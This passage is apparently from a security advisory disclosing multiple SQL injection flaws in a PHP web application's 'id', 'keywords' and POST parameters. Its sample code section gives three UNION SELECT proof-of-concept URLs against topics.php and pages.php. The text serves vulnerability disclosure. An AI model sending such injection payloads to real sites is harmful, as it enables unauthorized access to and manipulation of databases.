II. DESCRIPTION

Some parameters are not sanitised before being  used  in
SQL queries.


III. ANALYSIS

Summary:

 A) Multiple SQL Injection


A) Multiple SQL Injection
_________________________

Input passed to "id", "keywords" and  to  some parameters
sent  via  POST  method, is not properly sanitised before
being  used  in SQL queries. This  can  be  exploited  to
manipulate  SQL  queries by injecting arbitrary SQL code.

Successful  exploitation,  only  in some  cases, requires
that magic_quotes_gpc is set to Off.


IV. SAMPLE CODE
_______________

A) Multiple SQL Injection

The following sample code don't need requirements.

http://site/path/topics.php?action=ShowComment&id=-1 UNION SELECT 1,2,3,4,5,6,7%23

The following sample codes require  that magic_quotes_gpc
is set to Off:

http://site/path/pages.php?id=-1' UNION SELECT 1,2,3,4,1,6,7,1%23
http://site/path/topics.php?action=show&id=-1' UNION SELECT 1,2,3,4,5,6,7,8%23
